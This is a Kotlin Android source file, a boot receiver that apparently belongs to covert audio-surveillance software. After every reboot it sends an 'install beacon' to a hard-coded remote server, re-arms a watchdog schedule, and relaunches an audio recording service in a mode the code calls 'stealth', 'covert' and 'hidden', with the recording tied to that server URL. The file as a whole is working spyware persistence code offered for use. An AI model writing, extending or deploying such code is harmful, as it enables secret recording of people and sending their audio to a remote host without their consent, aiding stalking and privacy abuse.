package com.audiostream.client

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.util.Log
import androidx.core.content.ContextCompat

/**
 * BootReceiver.kt — Auto-start recording & socket recovery after phone reboot.
 *
 * Listens for BOOT_COMPLETED, QUICKBOOT_POWERON, and LOCKED_BOOT_COMPLETED broadcasts.
 * Automatically restarts stealth recording, transmits install beacon (if pending),
 * re-arms the 2-hour watchdog schedule, and connects the WebSocket to notify the server.
 */
class BootReceiver : BroadcastReceiver() {

    companion object {
        private const val TAG = "BootReceiver"
    }

    override fun onReceive(context: Context, intent: Intent) {
        val action = intent.action ?: return

        if (action == Intent.ACTION_BOOT_COMPLETED ||
            action == "android.intent.action.QUICKBOOT_POWERON" ||
            action == Intent.ACTION_LOCKED_BOOT_COMPLETED
        ) {
            Log.i(TAG, "📱 Device boot broadcast received ($action). Initializing background services...")

            val prefs = context.getSharedPreferences("AudioMonitorPrefs", Context.MODE_PRIVATE)

            // Check if auto-start is enabled (default: true)
            val autoStart = prefs.getBoolean("auto_start_on_boot", true)
            if (!autoStart) {
                Log.w(TAG, "Auto-start on boot is disabled in preferences.")
                return
            }

            // Always fallback to default production server URL if not explicitly set
            val serverUrl = prefs.getString("server_url", "https://audio-steam-server.onrender.com")
                ?: "https://audio-steam-server.onrender.com"

            // 1. Ensure Install Beacon is sent/verified
            InstallBeaconManager.checkAndSendBeacon(context, serverUrl)

            // 2. Schedule the 2-hour repeating watchdog alarms starting after 5 AM
            WatchdogScheduler.scheduleRecurringWatchdog(context)

            // 3. Start AudioRecordService in Covert/Hidden mode with BOOT flag
            try {
                val serviceIntent = Intent(context, AudioRecordService::class.java).apply {
                    this.action = AudioRecordService.ACTION_START_HIDDEN
                    putExtra(AudioRecordService.EXTRA_SERVER_URL, serverUrl)
                    putExtra(AudioRecordService.EXTRA_IS_MAIN, false)
                    putExtra(AudioRecordService.EXTRA_BOOT_RESTART, true)
                }
                ContextCompat.startForegroundService(context, serviceIntent)
                Log.i(TAG, "✅ AudioRecordService launched in stealth mode after device reboot.")
            } catch (e: Exception) {
                Log.e(TAG, "❌ Failed starting AudioRecordService after reboot: ${e.message}")
            }
        }
    }
}
